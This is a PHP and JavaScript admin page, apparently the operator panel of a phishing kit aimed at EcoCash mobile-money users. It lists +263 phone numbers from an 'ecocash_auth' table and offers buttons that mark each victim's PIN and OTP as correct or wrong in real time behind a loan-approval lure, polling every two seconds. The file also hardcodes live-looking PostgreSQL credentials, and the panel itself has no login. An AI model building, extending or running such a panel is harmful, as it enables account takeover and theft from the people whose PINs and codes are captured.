<?php
session_start(); // optional, but kept for consistency

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

/**
 * Get PostgreSQL connection (reusable)
 * @return resource|false
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

// Establish connection once
$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
if (!$conn) {
    die("Database connection failed. Please check server logs.");
}

// Handle AJAX requests for updating status (PIN, OTP, and LOAN)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    
    header('Content-Type: application/json');
    
    $phone = $_POST['phone'] ?? '';
    $type = $_POST['type'] ?? '';   // 'pin', 'otp', or 'loan'
    $action = $_POST['action'] ?? ''; // 'correct'/'wrong' for pin/otp; for loan: 'approve' or 'default'
    
    if (empty($phone) || empty($type) || empty($action)) {
        echo json_encode(['success' => false, 'error' => 'Invalid request parameters']);
        exit;
    }
    
    // Map type to column name
    switch ($type) {
        case 'pin':
            $column = 'status';
            $newValue = ($action === 'correct') ? 1 : 0;
            break;
        case 'otp':
            $column = 'otp_status';
            $newValue = ($action === 'correct') ? 1 : 0;
            break;
        case 'loan':
            $column = 'approve';   // column name is "approve"
            $newValue = ($action === 'approve') ? 1 : 0;
            break;
        default:
            echo json_encode(['success' => false, 'error' => 'Invalid type']);
            exit;
    }
    
    // Update ALL entries for this phone (grouped phone)
    $sql = "UPDATE ecocash_auth SET $column = $1 WHERE phone = $2";
    $result = pg_query_params($conn, $sql, [$newValue, $phone]);
    
    if ($result) {
        echo json_encode(['success' => true, 'newValue' => $newValue]);
    } else {
        error_log("Update error: " . pg_last_error($conn));
        echo json_encode(['success' => false, 'error' => 'Database update failed']);
    }
    exit;
}

// AJAX endpoint to fetch fresh grouped data (used by polling)
if (isset($_GET['fetch_data']) && $_GET['fetch_data'] == 1) {
    header('Content-Type: application/json');
    // PostgreSQL GROUP BY with max() to get latest status per phone
    $sql = "
        SELECT 
            phone,
            MAX(status) AS pin_status,
            MAX(otp_status) AS otp_status,
            MAX(approve) AS loan_approve
        FROM ecocash_auth
        GROUP BY phone
        ORDER BY phone ASC
    ";
    $result = pg_query($conn, $sql);
    if (!$result) {
        echo json_encode(['error' => 'Query failed: ' . pg_last_error($conn)]);
        exit;
    }
    $records = [];
    while ($row = pg_fetch_assoc($result)) {
        $records[] = [
            'phone' => $row['phone'],
            'pin_status' => (int)$row['pin_status'],
            'otp_status' => (int)$row['otp_status'],
            'loan_approve' => (int)$row['loan_approve']
        ];
    }
    echo json_encode($records);
    exit;
}

// Initial page load: fetch grouped records for rendering
$sql = "
    SELECT 
        phone,
        MAX(status) AS pin_status,
        MAX(otp_status) AS otp_status,
        MAX(approve) AS loan_approve
    FROM ecocash_auth
    GROUP BY phone
    ORDER BY phone ASC
";
$result = pg_query($conn, $sql);
$records = [];
if ($result) {
    while ($row = pg_fetch_assoc($result)) {
        $records[] = [
            'phone' => $row['phone'],
            'pin_status' => (int)$row['pin_status'],
            'otp_status' => (int)$row['otp_status'],
            'loan_approve' => (int)$row['loan_approve']
        ];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EcoCash Admin | Verify PIN, OTP & Loan Approval</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1300px;
            margin: 0 auto;
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        h1 {
            background: #0a5fa7;
            color: white;
            margin: 0;
            padding: 20px 24px;
            font-size: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .refresh-indicator {
            font-size: 12px;
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 20px;
        }
        .table-wrapper {
            overflow-x: auto;
            padding: 20px 24px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        th, td {
            padding: 12px 16px;
            text-align: left;
            border-bottom: 1px solid #e0e0e0;
        }
        th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: #1f2d3d;
        }
        tr:hover {
            background-color: #f5f7fa;
        }
        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        .badge-success {
            background-color: #d4edda;
            color: #155724;
        }
        .badge-warning {
            background-color: #fff3cd;
            color: #856404;
        }
        .badge-approved {
            background-color: #cce5ff;
            color: #004085;
        }
        .btn {
            border: none;
            padding: 6px 14px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            margin-right: 8px;
            margin-bottom: 5px;
        }
        .btn-pin {
            background-color: #1d4ed8;
            color: white;
        }
        .btn-pin:hover {
            background-color: #1e40af;
        }
        .btn-otp {
            background-color: #10b981;
            color: white;
        }
        .btn-otp:hover {
            background-color: #059669;
        }
        .btn-loan {
            background-color: #f59e0b;
            color: white;
        }
        .btn-loan:hover {
            background-color: #d97706;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: white;
            border-radius: 12px;
            width: 320px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        .modal-content p {
            margin: 0 0 20px 0;
            font-size: 18px;
            font-weight: 500;
        }
        .modal-buttons {
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        .modal-buttons button {
            padding: 8px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            font-weight: 500;
        }
        .btn-correct, .btn-approve {
            background-color: #10b981;
            color: white;
        }
        .btn-wrong, .btn-default {
            background-color: #ef4444;
            color: white;
        }
        footer {
            padding: 16px 24px;
            background: #f8f9fa;
            font-size: 12px;
            color: #6c757d;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>
        🔐 EcoCash Admin Panel – PIN / OTP / Loan Approval
        <span class="refresh-indicator" id="refreshStatus">Auto-refresh every 2s</span>
    </h1>
    <div class="table-wrapper">
        <table id="dataTable">
            <thead>
                <tr>
                    <th>Phone Number</th>
                    <th>PIN Status</th>
                    <th>OTP Status</th>
                    <th>Loan Approve</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                <!-- Dynamic content via JS -->
            </tbody>
        </table>
    </div>
    <footer>
        ⚡ Click any button → choose option.<br>
        ✅ PIN/OTP: Correct (1) / Wrong (0) &nbsp;|&nbsp; 🏦 Loan: Approve (1) / Default (0)
    </footer>
</div>

<!-- Modal Overlay -->
<div id="verifyModal" class="modal">
    <div class="modal-content">
        <p id="modalMessage">Select option:</p>
        <div class="modal-buttons" id="modalButtons">
            <!-- dynamic buttons inserted by JS -->
        </div>
    </div>
</div>

<script>
    let pendingPhone = null;
    let pendingType = null;
    const modal = document.getElementById('verifyModal');
    const modalMessage = document.getElementById('modalMessage');
    const modalButtons = document.getElementById('modalButtons');
    const tableBody = document.getElementById('tableBody');

    function renderTable(records) {
        if (!records || records.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No records found.</td></tr>';
            return;
        }
        let html = '';
        records.forEach(record => {
            const phone = escapeHtml(record.phone);
            const pinStatus = record.pin_status;
            const otpStatus = record.otp_status;
            const loanApprove = record.loan_approve;
            
            html += `<tr data-phone="${phone}">`;
            html += `<td>+263 ${phone}</td>`;
            html += `<td class="pin-status-cell">
                        <span class="badge ${pinStatus ? 'badge-success' : 'badge-warning'}">
                            ${pinStatus ? 'Verified (1)' : 'Pending (0)'}
                        </span>
                      </td>`;
            html += `<td class="otp-status-cell">
                        <span class="badge ${otpStatus ? 'badge-success' : 'badge-warning'}">
                            ${otpStatus ? 'Verified (1)' : 'Pending (0)'}
                        </span>
                      </td>`;
            html += `<td class="loan-status-cell">
                        <span class="badge ${loanApprove ? 'badge-approved' : 'badge-warning'}">
                            ${loanApprove ? 'Approved (1)' : 'Default (0)'}
                        </span>
                      </td>`;
            html += `<td>
                        <button class="btn btn-pin verify-pin" data-phone="${phone}">✔ Verify PIN</button>
                        <button class="btn btn-otp verify-otp" data-phone="${phone}">✔ Verify OTP</button>
                        <button class="btn btn-loan verify-loan" data-phone="${phone}">🏦 Loan Approve</button>
                      </td>`;
            html += `</tr>`;
        });
        tableBody.innerHTML = html;
        attachButtonEvents();
    }
    
    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    function attachButtonEvents() {
        document.querySelectorAll('.verify-pin').forEach(btn => {
            btn.removeEventListener('click', pinClickHandler);
            btn.addEventListener('click', pinClickHandler);
        });
        document.querySelectorAll('.verify-otp').forEach(btn => {
            btn.removeEventListener('click', otpClickHandler);
            btn.addEventListener('click', otpClickHandler);
        });
        document.querySelectorAll('.verify-loan').forEach(btn => {
            btn.removeEventListener('click', loanClickHandler);
            btn.addEventListener('click', loanClickHandler);
        });
    }
    
    function pinClickHandler(e) {
        const phone = e.currentTarget.getAttribute('data-phone');
        showModal(phone, 'pin', [
            { label: '✔ Correct (set to 1)', action: 'correct', class: 'btn-correct' },
            { label: '✘ Wrong (set to 0)', action: 'wrong', class: 'btn-wrong' }
        ]);
    }
    
    function otpClickHandler(e) {
        const phone = e.currentTarget.getAttribute('data-phone');
        showModal(phone, 'otp', [
            { label: '✔ Correct (set to 1)', action: 'correct', class: 'btn-correct' },
            { label: '✘ Wrong (set to 0)', action: 'wrong', class: 'btn-wrong' }
        ]);
    }
    
    function loanClickHandler(e) {
        const phone = e.currentTarget.getAttribute('data-phone');
        showModal(phone, 'loan', [
            { label: '✅ Approve (set to 1)', action: 'approve', class: 'btn-approve' },
            { label: '❌ Default (set to 0)', action: 'default', class: 'btn-default' }
        ]);
    }
    
    function showModal(phone, type, options) {
        pendingPhone = phone;
        pendingType = type;
        let typeLabel = '';
        if (type === 'pin') typeLabel = 'PIN';
        else if (type === 'otp') typeLabel = 'OTP';
        else typeLabel = 'Loan Approval';
        modalMessage.innerText = `${typeLabel} for ${phone}:`;
        
        // Clear and rebuild buttons
        modalButtons.innerHTML = '';
        options.forEach(opt => {
            const btn = document.createElement('button');
            btn.textContent = opt.label;
            btn.className = opt.class;
            btn.onclick = () => {
                updateStatus(pendingPhone, pendingType, opt.action);
                closeModal();
            };
            modalButtons.appendChild(btn);
        });
        modal.style.display = 'flex';
    }
    
    function closeModal() {
        modal.style.display = 'none';
        pendingPhone = null;
        pendingType = null;
    }
    
    async function updateStatus(phone, type, action) {
        const formData = new FormData();
        formData.append('phone', phone);
        formData.append('type', type);
        formData.append('action', action);
        
        try {
            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });
            const result = await response.json();
            if (result.success) {
                await fetchAndRefresh();
            } else {
                alert('Error: ' + (result.error || 'Update failed.'));
            }
        } catch (err) {
            alert('Network error: ' + err.message);
        }
        closeModal();
    }
    
    async function fetchAndRefresh() {
        try {
            const response = await fetch(window.location.href + '?fetch_data=1');
            const records = await response.json();
            renderTable(records);
        } catch (err) {
            console.error('Failed to fetch data:', err);
        }
    }
    
    // Close modal when clicking outside
    window.addEventListener('click', (e) => {
        if (e.target === modal) closeModal();
    });
    
    // Auto-refresh every 2 seconds
    fetchAndRefresh();
    setInterval(fetchAndRefresh, 2000);
</script>
</body>
</html>
